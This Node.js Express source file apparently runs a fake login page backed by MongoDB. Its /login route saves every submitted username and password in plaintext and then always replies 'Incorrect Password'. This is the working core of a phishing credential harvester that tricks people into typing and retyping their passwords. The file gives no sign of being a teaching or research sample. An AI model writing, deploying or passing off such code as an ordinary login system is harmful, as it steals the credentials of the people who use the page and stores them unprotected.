// Import dependencies
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
// Initialize the app
const app = express();

// Connect to MongoDB
mongoose.connect('mongodb://localhost:27017/userDB', {
}).then(() => {
    console.log('Connected to MongoDB');
}).catch((err) => {
    console.error('Error connecting to MongoDB', err);
});
// new update
// Create a Mongoose Schema now date 
const userSchema = new mongoose.Schema({
    username: String,
    password: String
});

// Create a model from the schema
const User = mongoose.model('User', userSchema);

// Set up middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Set EJS as the templating engine
app.set('view engine', 'ejs');

// Routes
app.get('/', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    // Extract the submitted form data
    const username = req.body.username;
    const password = req.body.password;

    // Create a new user and save to the database
    const newUser = new User({
        username: username,
        password: password
    });

    newUser.save()
    res.send("<b>Incorrect Password</b>")
});

// Start the server
const PORT = process.env.PORT || 4141;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
